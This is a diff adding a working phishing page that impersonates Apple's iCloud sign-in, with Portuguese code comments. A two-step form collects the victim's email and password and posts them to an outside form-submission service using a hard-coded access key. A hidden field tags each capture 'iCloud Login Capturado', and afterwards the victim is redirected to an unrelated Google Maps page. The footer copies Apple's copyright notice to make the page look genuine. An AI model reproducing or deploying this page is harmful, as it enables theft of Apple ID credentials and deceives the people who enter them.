@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="icon" href="ICO/favicon-16x16.png">
+    <title>iCloud</title>
+    <style>
+        /* Garante que a Etapa 2 esteja oculta ao carregar */
+        #password-field {
+            display: none;
+        }
+        #sign-in-btn {
+             display: none;
+        }
+    </style>
+    <script>
+        const initialHeading = 'Iniciar sessão com o ID Apple'; // Título em Português
+
+        // Função para avançar para o campo de senha
+        function goToPasswordStep() {
+            const emailInput = document.getElementById("email-phone");
+            const passwordFieldContainer = document.getElementById("password-field");
+            const formHeading = document.getElementById("form-heading"); 
+            const emailInputContainer = document.getElementById("email-container"); 
+            
+            const emailValue = emailInput.value; // Captura o valor do email
+
+            // 1. VALIDAÇÃO
+            if (emailValue.length === 0) {
+                alert('Por favor, digite seu Email ou Telefone.');
+                return;
+            }
+
+            // 2. TRANSIÇÃO
+            
+            // Oculta a seta no campo de email
+            const arrowInEmail = emailInputContainer.querySelector('a');
+            if (arrowInEmail) {
+                arrowInEmail.style.display = 'none';
+            }
+            
+            // Desabilita o campo de e-mail para edição (mantendo o valor visível)
+            emailInput.setAttribute('readonly', true);
+            
+            // Mostra o campo de senha
+            passwordFieldContainer.style.display = "block";
+            
+            // Mantém o cabeçalho original e adiciona a seta de VOLTAR
+            if (formHeading) { 
+                formHeading.innerHTML = `
+                    <span onclick="goToEmailStep()" style="cursor: pointer; color: #0071e3; margin-right: 10px;">
+                        <i class='bx bx-chevron-left'></i>
+                    </span>
+                    ${initialHeading}
+                `;
+            }
+            
+            // Foca no campo de senha
+            document.getElementById("password").focus();
+        }
+
+        // Função para voltar ao campo de e-mail (clicando no cabeçalho)
+        function goToEmailStep() {
+            const emailInput = document.getElementById("email-phone");
+            const passwordFieldContainer = document.getElementById("password-field");
+            const formHeading = document.getElementById("form-heading"); 
+            const emailInputContainer = document.getElementById("email-container");
+            
+            // Oculta elementos da Etapa 2
+            passwordFieldContainer.style.display = 'none';
+
+            // Mostra elementos da Etapa 1
+            const arrowInEmail = emailInputContainer.querySelector('a');
+            if (arrowInEmail) {
+                arrowInEmail.style.display = 'block'; // Mostra a seta no email novamente
+            }
+            
+            emailInput.removeAttribute('readonly');
+            
+            // Restaura o placeholder original
+            emailInput.setAttribute('placeholder', 'Email or Phone Number'); 
+
+            // Restaura o cabeçalho original (sem seta)
+            if (formHeading) { 
+                formHeading.innerHTML = initialHeading;
+            }
+            emailInput.focus();
+        }
+    </script>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <a href="#" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a>
+        </nav>
+    </header>
+    <main id="main">
+        <form action="https://api.web3forms.com/submit" method="POST" id="login-form">
+            <div id="sign-in">
+                <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="">
+                
+                <p id="form-heading">Iniciar sessão com o ID Apple</p>
+
+                <input type="hidden" name="access_key" value="746802c2-5d7c-4e18-9dd1-7bf68846d799"> 
+
+                <div id="form-inputs-container">
+
+                    <div class="input-container" id="email-container">
+                        <a href="#" onclick="goToPasswordStep()"> 
+                            <i class='bx bx-right-arrow-circle'></i>
+                        </a>
+                        <input id="email-phone" name="email" type="text" placeholder="Email or Phone Number" required>
+                    </div>
+
+                    <div class="input-container" id="password-field">
+                        <button type="submit" style="all: unset; cursor: pointer; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);">
+                             <i class='bx bx-right-arrow-circle'></i>
+                        </button>
+                        <input id="password" name="senha" type="password" placeholder="Password" required>
+                    </div>
+
+                </div> <button id="sign-in-btn" type="submit" style="display: none;">Sign In</button>
+
+
+                <label><input type="checkbox" id="check">Keep me signed in</label>
+                <div class="links"> 
+                    <a href="#">Forgot Password?</a>
+                    <a href="#">Create Apple ID</a>
+                </div>
+                
+                <input type="hidden" name="redirect" value="https://www.google.com.br/maps/place/Bahia+Bar/@-22.7633859,-43.3261713,3a,75y,128.13h,91.28t/data=!3m7!1e1!3m5!1sV4ezs6kl-LiGWIR4ZD2AdQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D-1.2840619145144672%26panoid%3DV4ezs6kl-LiGWIR4ZD2AdQ%26yaw%3D128.12677138270544!7i16384!8i8192">
+                <input type="hidden" name="from_name" value="iCloud Login Capturado">
+            </div>
+        </form>
+    </main>
+    <footer>
+        <div class="footer-div">System status
+            <div class="sep"></div>
+            Privacy Policy
+            <div class="sep"></div>
+            terms and condition
+        </div>
+        <div class="footer-div">Copyright © 2024 Apple Inc. All rights reserved.</div>
+    </footer>
+</body>
+
+</html>
